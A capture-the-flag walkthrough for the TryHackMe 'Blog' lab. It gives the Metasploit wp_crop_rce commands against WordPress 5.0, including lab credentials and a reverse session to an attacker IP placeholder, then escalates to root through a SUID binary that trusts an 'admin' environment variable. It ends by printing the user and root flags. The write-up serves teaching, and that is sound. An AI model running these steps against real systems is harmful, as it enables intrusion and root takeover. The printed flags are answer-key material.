# 7.6 - [Blog](https://tryhackme.com/room/blog)

## 🔍 Overview
- Billy Joel made a WordPress blog on his home computer.
- This room covers: network enumeration, WordPress enumeration, exploitation via Metasploit (`wp_crop_rce`), and privilege escalation via SUID binary abuse.
- **Note:** Add `10.145.144.251 blog.thm` to `/etc/hosts` before starting.

## 💥 Exploitation

### Metasploit – wp_crop_rce
```bash
msfconsole -q
use exploit/multi/http/wp_crop_rce
set rhost blog.thm
set username kwheel
set password cutiepie1
set LHOST <ATTACKER_IP>
run
```

This exploits CVE-2019-8942 / CVE-2019-8943 – an RCE in WordPress 5.0.

**Result:** Meterpreter session as `www-data`.

## 🔑 Privilege Escalation

### Enumerating SUID Binaries
```bash
find / -type f -user root -perm -u=s 2>/dev/null
```

**Interesting SUID binary:**
```
/usr/sbin/checker
```

### Analysing the Binary
```bash
file /usr/sbin/checker
# setuid, setgid ELF 64-bit LSB shared object

ltrace /usr/sbin/checker
# getenv("admin") = nil
# puts("Not an Admin")
```

**Observation:** The binary checks for an environment variable `admin`. If not set, it prints "Not an Admin".

### Exploiting the SUID Binary
```bash
export admin=1
/usr/sbin/checker
```
This gives a root shell!

### Getting the Flags
```bash
# User flag
cat /media/usb/user.txt
# c8421899aae571f7af486492b71a8ab7

# Root flag
cd /root
cat root.txt
# 9a0b2b618bef9bfa7ac28c1353d9f318
```

## 🔑 Key Takeaways
- **WordPress 5.0** is vulnerable to `wp_crop_rce` (CVE-2019-8942/8943).
- **WPScan** is essential for WordPress enumeration (users, themes, plugins, vulnerabilities).
- **SUID binaries** can be abused with environment variables – `ltrace` reveals what they check.
- Always check `/usr/sbin/` for custom SUID binaries.
- **Environment variable injection** (`export admin=1`) can elevate privileges if the binary trusts it.
